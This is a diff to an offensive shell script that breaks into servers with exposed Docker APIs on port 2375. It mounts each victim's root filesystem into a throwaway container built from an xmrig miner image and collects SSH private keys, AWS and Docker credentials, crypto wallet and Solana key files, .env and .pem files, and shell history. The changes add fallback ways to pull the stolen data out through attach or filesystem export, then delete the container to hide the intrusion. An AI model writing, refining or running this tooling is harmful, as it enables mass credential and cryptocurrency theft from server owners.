@@ -29,6 +29,12 @@ OUT=loot; mkdir -p "$OUT" 2>/dev/null
 TAGIMG=${DOCK_IMAGE:-xmrig/xmrig}
 
 CMD1='echo ==UNAME; uname -a; echo ==ROOTLS; ls -la /h/root 2>/dev/null | head -25; echo ==SSH; ls -la /h/root/.ssh 2>/dev/null; echo ==IDRSA; head -c 140 /h/root/.ssh/id_rsa 2>/dev/null; echo; echo ==AWS; cat /h/root/.aws/credentials 2>/dev/null; echo; echo ==DOCKERCFG; head -c 500 /h/root/.docker/config.json 2>/dev/null; echo; echo ==SOLANA; head -c 120 /h/root/.config/solana/id.json 2>/dev/null; echo; echo ==COMPOSE; find /h/opt /h/srv /h/app /h/home /h/root /h/var/www -maxdepth 4 -name docker-compose.yml 2>/dev/null | head -8; echo ==ENVFILES; find /h/opt /h/srv /h/app /h/home /h/root /h/var/www -maxdepth 4 -name .env 2>/dev/null | head -8; echo ==WALLETISH; find /h/root /h/home /h/opt /h/srv -maxdepth 4 -name wallet.dat 2>/dev/null | head -5; echo ==KEYFILES; find /h/root /h/home /h/opt /h/srv -maxdepth 4 -name *.keys 2>/dev/null | head -6; echo ==PEMS; find /h/root /h/home /h/opt /h/srv -maxdepth 4 -name *.pem 2>/dev/null | head -6; echo ==HISTORY; tail -c 400 /h/root/.bash_history 2>/dev/null; echo; echo ==END'
+# The findings are also written to a file INSIDE the container, because /logs answers
+# empty on a big slice of this population (old engines and api proxies - the repo's own
+# note says so, and it bit us on the first run). With the loot on the container's own
+# filesystem there is a read path that needs no /logs at all: GET /containers/<id>/export
+# streams the filesystem and box1's tar pulls the file out.
+CMD1X="($CMD1) > /loot.txt 2>&1; echo ==FROMFILE; cat /loot.txt"
 
 loot1() {
     ip=$1; u="http://$ip:2375"
@@ -46,22 +52,41 @@ loot1() {
           | cut -c1-150 | sed 's/^/     /' | head -6
     done
     echo "--- TIER1: their root filesystem as root (throwaway, no pull, deleted after)"
-    body="{\"Image\":\"$TAGIMG\",\"Entrypoint\":[\"/bin/sh\",\"-c\"],\"Cmd\":[\"$CMD1\"],\"HostConfig\":{\"Binds\":[\"/:/h:ro\"],\"NetworkMode\":\"host\"}}"
+    body="{\"Image\":\"$TAGIMG\",\"Entrypoint\":[\"/bin/sh\",\"-c\"],\"Cmd\":[\"$CMD1X\"],\"HostConfig\":{\"Binds\":[\"/:/h:ro\"],\"NetworkMode\":\"host\"}}"
     lid=""; n=0
     while [ "$n" -lt 2 ] && [ -z "$lid" ]; do
         n=$((n + 1))
+        # unique name per run: a killed run can leave an exited throwaway behind, and a
+        # taken name makes create answer 409 WITHOUT an Id - so the loot would silently
+        # report "create failed" forever. Per-pid names can never collide with a corpse.
+        nm="lk$$$n"
         r=$(curl -sS -m 90 -X POST -H 'Content-Type: application/json' -d "$body" \
-             "$u/containers/create?name=kwloot$n" 2>/dev/null) || r=""
+             "$u/containers/create?name=$nm" 2>/dev/null) || r=""
         lid=$(printf '%s' "$r" | grep -o '"Id":"[0-9a-f]\{20,\}"' | head -1 | cut -d'"' -f4)
-        [ -n "$lid" ] || echo "  create try $n failed: $(printf '%s' "$r" | head -c 120)"
+        [ -n "$lid" ] || echo "  create try $n ($nm) failed: $(printf '%s' "$r" | head -c 110)"
     done
     if [ -n "$lid" ]; then
-        curl -sS -m 40 -X POST "$u/containers/$lid/start" >/dev/null 2>&1
+        sb=$(curl -sS -m 45 -X POST "$u/containers/$lid/start" 2>&1) || sb="start-error"
         sleep 3
-        curl -sS -m 25 "$u/containers/$lid/logs?stdout=1&stderr=1" 2>/dev/null | tr -d '\000\r'
-        echo
+        ec=$(curl -sS -m 8 "$u/containers/$lid/json" 2>/dev/null | grep -o '"ExitCode":[0-9-]*' | head -1 | cut -d: -f2)
+        out=$(curl -sS -m 25 "$u/containers/$lid/logs?stdout=1&stderr=1" 2>/dev/null | tr -d '\000\r')
+        how=logs
+        if [ -z "$out" ]; then
+            out=$(curl -sS -m 25 -X POST \
+                  "$u/containers/$lid/attach?stdout=1&stderr=1&logs=1&stream=0" 2>/dev/null | tr -d '\000\r')
+            how=attach
+        fi
+        if [ -z "$out" ]; then
+            out=$(curl -sS -m 60 "$u/containers/$lid/export" 2>/dev/null \
+                  | tar -xO loot.txt 2>/dev/null | tr -d '\000\r')
+            [ -n "$out" ] || out=$(curl -sS -m 60 "$u/containers/$lid/export" 2>/dev/null \
+                  | tar -xO ./loot.txt 2>/dev/null | tr -d '\000\r')
+            how=export
+        fi
+        printf '%s\n' "$out"
+        echo "  (read=$how exit=${ec:-?} id=$lid)"
+        [ -z "$out" ] && echo "  start said: $(printf '%s' "$sb" | head -c 100)"
         curl -sS -m 25 -X DELETE "$u/containers/$lid?force=1" >/dev/null 2>&1
-        echo "  (throwaway $lid deleted)"
     fi
 }
 
